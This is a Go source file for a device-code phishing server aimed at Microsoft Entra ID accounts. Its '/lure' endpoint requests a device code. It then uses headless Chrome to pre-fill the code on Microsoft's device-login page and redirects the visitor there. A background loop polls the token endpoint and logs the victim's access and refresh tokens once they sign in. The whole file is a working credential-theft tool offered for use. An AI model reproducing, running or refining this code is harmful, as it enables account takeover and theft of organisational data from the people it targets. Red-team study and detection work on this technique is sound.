package main

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"github.com/chromedp/chromedp"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const MS_AUTHENTICATION_BROKER string = "29d9ed98-a469-4536-ade2-f981bc1d605e"

//const MS_INTUNE_COMPANY_PORTAL string = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
//const MS_INTUNE_WEB_COMPANY_PORTAL string = "74bcdadc-2fdc-4bb3-8459-76d06952a0e9"

var address = flag.String("address", ":8080", "Provide the listening address")
var tenant = flag.String("tenant", "common", "Provide the tenant")
var clientId = flag.String("client-id", MS_AUTHENTICATION_BROKER, "Provide the clientId")
var verbose = flag.Bool("verbose", false, "Provide the clientId")

var logger = log.New(os.Stdout, "", log.LstdFlags)

type DeviceAuth struct {
	DeviceCode      string `json:"device_code"`
	UserCode        string `json:"user_code"`
	VerificationUri string `json:"verification_uri"`
	ExpiredIn       int    `json:"expires_in"`
	Interval        int    `json:"interval"`
}

type AuthenticationResult struct {
	TokenType    string `json:"token_type"`
	Scope        string `json:"scope"`
	AccessToken  string `json:"access_token"`
	IdToken      string `json:"id_token"`
	RefreshToken string `json:"refresh_token"`
	ExpiresIn    int    `json:"expires_in"`
}

type AuthenticationError struct {
	Type        string `json:"error"`
	Description string `json:"error_description"`
}

const (
	PENDING string = "authorization_pending"
)

func lureHandler(w http.ResponseWriter, r *http.Request) {
	log.Println("Lure opened...")
	scopes := []string{"openid", "profile"}
	deviceAuth, err := requestDeviceAuth(*tenant, *clientId, scopes)
	if err != nil {
		log.Println(err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	redirectUri, err := startLogon(deviceAuth)
	if err != nil {
		log.Println(err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	go startPollForToken(*tenant, *clientId, deviceAuth)
	http.Redirect(w, r, redirectUri, http.StatusFound)
}

// https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code
func requestDeviceAuth(tenant string, clientId string, scopes []string) (*DeviceAuth, error) {
	resp, err := http.PostForm("https://login.microsoftonline.com/"+tenant+"/oauth2/v2.0/devicecode",
		url.Values{"client_id": {clientId}, "scope": {strings.Join(scopes, " ")}})

	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		errMsg := "Request failed with status code:" + resp.Status
		return nil, errors.New(errMsg)
	}

	var deviceAuth DeviceAuth
	err = json.NewDecoder(resp.Body).Decode(&deviceAuth)

	if err != nil {
		return nil, err
	}
	return &deviceAuth, nil
}

func startLogon(deviceAuth *DeviceAuth) (string, error) {
	allocatorOpts := append(chromedp.DefaultExecAllocatorOptions[:], chromedp.Flag("headless", true))
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), allocatorOpts...)

	var contextOpts []chromedp.ContextOption
	if *verbose {
		contextOpts = append(contextOpts, chromedp.WithDebugf(log.Printf))
	}

	ctx, cancel = chromedp.NewContext(
		ctx,
		contextOpts...,
	)

	defer cancel()

	var finalUrl string
	err := chromedp.Run(ctx,
		chromedp.Navigate(`https://microsoft.com/devicelogin`),

		chromedp.WaitVisible(`#idSIButton9`),
		chromedp.SendKeys(`#otc`, deviceAuth.UserCode),
		chromedp.Click(`#idSIButton9`),

		chromedp.WaitVisible(`#cantAccessAccount`),
		chromedp.Click(`#cantAccessAccount`),

		chromedp.WaitVisible(`#aadTitleHint`),
		chromedp.Click(`#aadTitleHint`),

		chromedp.WaitVisible(`#ContentPlaceholderMainContent_ButtonCancel`),
		chromedp.Click(`#ContentPlaceholderMainContent_ButtonCancel`),

		chromedp.WaitVisible(`#cantAccessAccount`),
		chromedp.Location(&finalUrl),
	)

	if err != nil {
		return "", err
	}

	return finalUrl, nil
}

func startPollForToken(tenant string, clientId string, deviceAuth *DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		log.Println("Check for token: " + deviceAuth.UserCode)
		result, err := requestToken(tenant, clientId, deviceAuth)

		if err != nil {
			log.Printf(`"%#v"`, err)
			return
		}

		if result != nil {
			log.Printf(`"%#v"`, result)
			return
		}
	}
}

func requestToken(tenant string, clientId string, deviceAuth *DeviceAuth) (*AuthenticationResult, error) {
	resp, err := http.PostForm("https://login.microsoftonline.com/"+tenant+"/oauth2/v2.0/token",
		url.Values{"grant_type": {"urn:ietf:params:oauth:grant-type:device_code"}, "client_id": {clientId}, "device_code": {deviceAuth.DeviceCode}})

	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		if resp.StatusCode == http.StatusBadRequest {
			var authErr AuthenticationError
			err = json.NewDecoder(resp.Body).Decode(&authErr)
			if err != nil {
				return nil, err
			}

			if authErr.Type == PENDING {
				return nil, nil
			} else if authErr.Type != "" {
				return nil, errors.New("Polling of device_code concluded with " + authErr.Type)
			}
		}

		errMsg := "Request failed with status code:" + resp.Status
		return nil, errors.New(errMsg)
	}

	var authResult AuthenticationResult
	err = json.NewDecoder(resp.Body).Decode(&authResult)

	if err != nil {
		return nil, err
	}

	return &authResult, nil
}

func main() {
	flag.Parse()

	// Set up a resource handler
	http.HandleFunc("/lure", lureHandler)

	// Create a Server instance to listen on port
	server := &http.Server{
		Addr: *address,
	}

	logger.Println("Start Server using Tenant:" + *tenant + " ClientId:" + *clientId)

	// Listen to HTTP connections and wait
	logger.Fatal(server.ListenAndServe())
}
